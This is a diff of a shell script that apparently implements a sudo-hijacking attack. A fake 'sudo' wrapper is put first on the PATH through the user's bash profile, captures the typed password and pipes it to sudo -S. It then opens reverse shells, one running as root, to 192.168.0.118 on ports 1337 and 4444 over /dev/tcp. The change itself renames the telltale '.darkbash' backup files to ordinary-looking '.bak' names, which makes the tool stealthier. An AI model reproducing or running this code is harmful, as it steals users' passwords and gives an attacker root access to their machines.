@@ -31,10 +31,10 @@ else
 	if [ -f ~/.bash_profile ]
     then
     rm ~/.bash_profile
-    mv ~/.darkbash ~/.bash_profile
+    mv ~/.bash_profile.bak ~/.bash_profile
     else
     rm ~/.bashrc
-    mv ~/.darkbashrc ~/.bashrc
+    mv ~/.bashrc.bak ~/.bashrc
     fi
     rm ~/.config/sudo/sudo
     echo "$pwd" | sudo -S disown !$ $(sudo /bin/bash -i  > /dev/tcp/192.168.0.118/1337 0<&1 2>&1) &
@@ -45,10 +45,10 @@ EOF
 chmod u+x ~/.config/sudo/sudo
 if [ -f ~/.bash_profile ]
 then
-    cp ~/.bash_profile ~/.darkbash
+    cp ~/.bash_profile ~/.bash_profile.bak
     echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile
 else
-    cp ~/.bashrc ~/.darkbashrc
+    cp ~/.bashrc ~/.bashrc.bak
     echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc
 fi
 disown !$ $(/bin/bash -i  > /dev/tcp/192.168.0.118/4444 0<&1 2>&1) &
